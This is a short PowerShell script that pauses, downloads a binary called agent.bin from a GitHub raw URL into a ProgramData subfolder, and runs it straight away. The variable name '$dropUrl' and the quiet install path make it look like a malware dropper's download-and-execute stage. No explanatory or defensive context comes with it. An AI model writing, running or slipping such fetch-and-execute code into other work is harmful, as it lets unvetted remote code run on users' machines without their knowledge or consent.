Start-Sleep 3
$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/agent.bin"
$destPath = "C:\ProgramData\sysdiag\agent.bin"
Invoke-WebRequest -Uri $dropUrl -OutFile $destPath
Start-Process $destPath
